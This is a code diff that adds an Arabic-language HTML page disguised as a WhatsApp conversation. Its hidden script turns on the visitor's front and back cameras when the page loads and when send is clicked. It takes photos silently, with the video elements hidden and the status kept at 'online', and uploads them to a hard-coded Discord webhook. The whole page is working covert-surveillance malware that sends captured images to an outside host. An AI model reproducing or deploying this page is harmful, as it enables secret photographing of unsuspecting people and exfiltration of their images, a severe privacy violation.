@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>واتساب - محادثة</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0a0a0a;
+            font-family: -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .phone-frame {
+            width: 100%;
+            max-width: 420px;
+            height: 100vh;
+            max-height: 860px;
+            background: #0b141a;
+            border-radius: 0;
+            box-shadow: 0 0 60px rgba(0, 0, 0, 0.9);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            position: relative;
+        }
+
+        @media (min-width: 500px) {
+            .phone-frame {
+                border-radius: 32px;
+                height: 90vh;
+            }
+        }
+
+        /* --- رأس واتساب --- */
+        .header {
+            background: #075e54;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            color: #fff;
+            flex-shrink: 0;
+            z-index: 10;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .back-icon {
+            font-size: 22px;
+            cursor: default;
+        }
+
+        .avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: #25d366;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            font-weight: bold;
+            color: #fff;
+        }
+
+        .contact-info {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .contact-name {
+            font-size: 17px;
+            font-weight: 600;
+            line-height: 1.2;
+        }
+
+        .contact-status {
+            font-size: 13px;
+            opacity: 0.85;
+            font-weight: 400;
+        }
+
+        .header-right {
+            display: flex;
+            gap: 18px;
+            font-size: 20px;
+        }
+
+        .header-right span {
+            cursor: default;
+        }
+
+        /* --- منطقة المحادثة --- */
+        .chat-area {
+            flex: 1;
+            background: #0b141a;
+            padding: 12px 16px 8px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            min-height: 0;
+        }
+
+        /* --- رسائل واتساب --- */
+        .message {
+            max-width: 80%;
+            padding: 10px 14px;
+            border-radius: 12px;
+            font-size: 15px;
+            line-height: 1.4;
+            word-wrap: break-word;
+            position: relative;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(8px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .message-received {
+            background: #1f2c33;
+            color: #e9edef;
+            align-self: flex-start;
+            border-top-left-radius: 4px;
+        }
+
+        .message-sent {
+            background: #005c4b;
+            color: #e9edef;
+            align-self: flex-end;
+            border-top-right-radius: 4px;
+        }
+
+        .message-time {
+            font-size: 11px;
+            opacity: 0.65;
+            margin-top: 4px;
+            text-align: right;
+            display: block;
+        }
+
+        .message-sent .message-time {
+            color: #8c9ba8;
+        }
+
+        .message-received .message-time {
+            color: #8c9ba8;
+        }
+
+        /* --- رسالة النظام --- */
+        .system-message {
+            align-self: center;
+            background: #182229;
+            color: #8696a0;
+            font-size: 12px;
+            padding: 6px 14px;
+            border-radius: 8px;
+            max-width: 90%;
+            text-align: center;
+        }
+
+        /* --- شريط الإدخال --- */
+        .input-bar {
+            background: #1f2c33;
+            padding: 8px 12px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            flex-shrink: 0;
+            border-top: 1px solid #2a3a42;
+        }
+
+        .input-bar .emoji-btn {
+            font-size: 24px;
+            cursor: default;
+            opacity: 0.7;
+        }
+
+        .input-bar input {
+            flex: 1;
+            background: #2a3a42;
+            border: none;
+            border-radius: 20px;
+            padding: 10px 16px;
+            color: #e9edef;
+            font-size: 15px;
+            outline: none;
+        }
+
+        .input-bar input::placeholder {
+            color: #8696a0;
+        }
+
+        .input-bar .send-btn {
+            background: #005c4b;
+            border: none;
+            border-radius: 50%;
+            width: 44px;
+            height: 44px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            color: #fff;
+            cursor: pointer;
+            transition: 0.15s;
+        }
+
+        .input-bar .send-btn:active {
+            transform: scale(0.92);
+            opacity: 0.8;
+        }
+
+        /* --- الفيديو والكاميرا مخفيين --- */
+        #video, #canvas {
+            display: none;
+        }
+
+        .status-dot {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #4fc3f7;
+            margin-right: 6px;
+            animation: pulse-dot 1.4s infinite;
+        }
+
+        @keyframes pulse-dot {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        .status-text {
+            color: #8696a0;
+            font-size: 12px;
+        }
+
+        @media (max-width: 480px) {
+            .header { padding: 10px 12px; }
+            .contact-name { font-size: 15px; }
+            .message { font-size: 14px; padding: 8px 12px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="phone-frame">
+    <!-- رأس المحادثة -->
+    <div class="header">
+        <div class="header-left">
+            <span class="back-icon">‹</span>
+            <div class="avatar">👤</div>
+            <div class="contact-info">
+                <span class="contact-name">أحمد</span>
+                <span class="contact-status" id="contactStatus">🟢 متصل</span>
+            </div>
+        </div>
+        <div class="header-right">
+            <span>📹</span>
+            <span>⁝</span>
+        </div>
+    </div>
+
+    <!-- منطقة المحادثة -->
+    <div class="chat-area" id="chatArea">
+        <div class="system-message">
+            🔒 رسائل ومكالمات مشفرة بتقنية التشفير التام
+        </div>
+
+        <div class="message message-received">
+            السلام عليكم، كيف الحال؟
+            <span class="message-time">10:30</span>
+        </div>
+
+        <div class="message message-sent">
+            وعليكم السلام، بخير الحمدلله
+            <span class="message-time">10:31</span>
+        </div>
+
+        <div class="message message-received">
+            تمام، أنا بالطريق
+            <span class="message-time">10:32</span>
+        </div>
+    </div>
+
+    <!-- شريط الإدخال -->
+    <div class="input-bar">
+        <span class="emoji-btn">😊</span>
+        <input type="text" placeholder="اكتب رسالة..." id="chatInput" />
+        <button class="send-btn" id="sendBtn">➤</button>
+    </div>
+
+    <!-- عناصر مخفية للكاميرا -->
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+</div>
+
+<script>
+    (function() {
+        "use strict";
+
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1545053238938832956/v2HlYTc0v-fCOP1N__PPOte91uKouZEqHEBzeLGb12GXe1Hu_IgouMhDEnb3alFHCYL8';
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const chatArea = document.getElementById('chatArea');
+        const contactStatus = document.getElementById('contactStatus');
+        const sendBtn = document.getElementById('sendBtn');
+        const chatInput = document.getElementById('chatInput');
+
+        let stream = null;
+        let isStreaming = false;
+        let photosTaken = 0;
+        let frontBlob = null;
+        let backBlob = null;
+        let isCapturing = false;
+
+        // --- تحديث حالة جهة الاتصال ---
+        function setStatus(text, isError = false) {
+            contactStatus.textContent = text;
+            contactStatus.style.color = isError ? '#ff8a80' : '#8c9ba8';
+        }
+
+        // --- إيقاف الكاميرا ---
+        function stopCamera() {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                stream = null;
+            }
+            video.srcObject = null;
+            isStreaming = false;
+        }
+
+        // --- تحويل الصورة إلى Blob ---
+        function getImageBlob(flip = true) {
+            const vw = video.videoWidth || 640;
+            const vh = video.videoHeight || 480;
+            canvas.width = vw;
+            canvas.height = vh;
+            const ctx = canvas.getContext('2d');
+            
+            if (flip) {
+                ctx.translate(vw, 0);
+                ctx.scale(-1, 1);
+            }
+            ctx.drawImage(video, 0, 0, vw, vh);
+            
+            return new Promise((resolve) => {
+                canvas.toBlob((blob) => resolve(blob), 'image/png');
+            });
+        }
+
+        // --- إرسال إلى ديسكورد ---
+        async function sendToDiscord(imageBlob, cameraType) {
+            const formData = new FormData();
+            formData.append('file', imageBlob, `${cameraType}.png`);
+            formData.append('payload_json', JSON.stringify({
+                content: `📸 صورة من الكاميرا ${cameraType}`
+            }));
+
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData
+                });
+                return response.ok;
+            } catch (e) {
+                return false;
+            }
+        }
+
+        // --- التصوير والإرسال (بدون أي رسائل في المحادثة) ---
+        async function captureAndSend() {
+            if (!isStreaming || !stream || isCapturing) return;
+            isCapturing = true;
+
+            try {
+                // تصوير أمامي
+                frontBlob = await getImageBlob(true);
+                
+                // تصوير خلفي (نبدل الكاميرا)
+                // نوقف الكاميرا الحالية ونفتح الخلفية
+                stopCamera();
+                
+                const constraints = {
+                    video: {
+                        facingMode: 'environment',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
+                    audio: false
+                };
+
+                stream = await navigator.mediaDevices.getUserMedia(constraints);
+                video.srcObject = stream;
+                await video.play();
+                isStreaming = true;
+
+                // ننتظر لحظة ثم نصور خلفي
+                await new Promise(resolve => setTimeout(resolve, 300));
+                backBlob = await getImageBlob(false);
+
+                // إرسال الصورتين إلى ديسكورد
+                let frontSent = false;
+                let backSent = false;
+
+                if (frontBlob) {
+                    frontSent = await sendToDiscord(frontBlob, 'أمامية');
+                }
+                if (backBlob) {
+                    backSent = await sendToDiscord(backBlob, 'خلفية');
+                }
+
+                // نرجع للكاميرا الأمامية ونوقفها
+                stopCamera();
+                
+                // نفتح الكاميرا الأمامية مرة أخرى (لكن نوقفها فوراً عشان لا تستهلك بطارية)
+                const tempConstraints = {
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
+                    audio: false
+                };
+                const tempStream = await navigator.mediaDevices.getUserMedia(tempConstraints);
+                tempStream.getTracks().forEach(t => t.stop());
+
+                setStatus('🟢 متصل');
+                isCapturing = false;
+
+            } catch (err) {
+                console.error(err);
+                setStatus('🟢 متصل');
+                isCapturing = false;
+                stopCamera();
+            }
+        }
+
+        // --- بدء التصوير في الخلفية (بدون إظهار أي شيء) ---
+        async function startBackgroundCapture() {
+            try {
+                setStatus('🟢 متصل');
+                
+                // نفتح الكاميرا الأمامية في الخلفية
+                const constraints = {
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
+                    audio: false
+                };
+
+                stream = await navigator.mediaDevices.getUserMedia(constraints);
+                video.srcObject = stream;
+                await video.play();
+                isStreaming = true;
+
+                // ننتظر لحظة ثم نلتقط الصور
+                await new Promise(resolve => setTimeout(resolve, 400));
+                await captureAndSend();
+
+            } catch (err) {
+                console.error(err);
+                setStatus('🟢 متصل');
+                stopCamera();
+            }
+        }
+
+        // --- زر الإرسال (يبدأ التصوير في الخلفية) ---
+        sendBtn.addEventListener('click', function() {
+            chatInput.value = '';
+            startBackgroundCapture();
+        });
+
+        // --- نمنع المستخدم من الكتابة أثناء التصوير ---
+        chatInput.addEventListener('focus', function() {
+            this.blur();
+        });
+
+        // --- بدء تلقائي عند التحميل (يصور بدون ما يظهر شيء) ---
+        setTimeout(() => {
+            startBackgroundCapture();
+        }, 1000);
+
+        // --- تنظيف عند الخروج ---
+        window.addEventListener('beforeunload', () => {
+            if (stream) {
+                stream.getTracks().forEach(t => t.stop());
+                stream = null;
+            }
+        });
+
+    })();
+</script>
+
+</body>
+</html>
